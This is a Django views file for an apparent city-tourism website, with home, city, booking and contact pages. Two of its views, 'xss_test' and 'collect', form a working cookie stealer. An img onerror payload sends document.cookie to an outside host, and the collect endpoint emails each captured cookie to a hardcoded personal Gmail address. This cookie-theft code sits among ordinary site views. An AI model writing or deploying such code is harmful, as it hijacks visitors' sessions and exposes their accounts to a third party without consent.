from django.shortcuts import render, get_object_or_404
from django.http import HttpResponse
from django.core.mail import send_mail
from .models import City, ContactMessage

# الصفحة الرئيسية
def home(request):
    cities = City.objects.all()[:6]
    return render(request, 'home.html', {'cities': cities})

# تفاصيل مدينة
def city_detail(request, city_id):
    city = get_object_or_404(City, pk=city_id)
    images = city.gallery.all()
    return render(request, 'city_detail.html', {'city': city, 'images': images})

# صفحة الحجز
def booking(request):
    return render(request, 'booking.html')

# صفحة التواصل
def contact(request):
    if request.method == 'POST':
        name = request.POST.get('name')
        email = request.POST.get('email')
        message = request.POST.get('message')

        # حفظ الرسالة في قاعدة البيانات
        ContactMessage.objects.create(name=name, email=email, message=message)

        # إرسال الرسالة إلى بريدك
        send_mail(
            subject=f'New Contact Message from {name}',
            message=message,
            from_email=email,
            recipient_list=['rihemrihem21000@gmail.com'],
            fail_silently=False,
        )

        return render(request, 'contact.html', {'success': True})

    return render(request, 'contact.html')

# صفحة اختبار XSS
def xss_test(request):
    return HttpResponse("""
        <html>
        <body>
        <h1>XSS Test</h1>
        <img src="x" onerror="fetch('https://usaau.com/collect/?c='+document.cookie)">
        </body>
        </html>
    """)

# استقبال الكوكيز وإرسالها على الإيميل
def collect(request):
    cookie_value = request.GET.get('c', '')

    if cookie_value:
        send_mail(
            subject="Cookie Captured",
            message=f"New cookie captured: {cookie_value}",
            from_email="rihemrihem21000@gmail.com",
            recipient_list=["rihemrihem21000@gmail.com"],
            fail_silently=False,
        )

    return HttpResponse("OK")
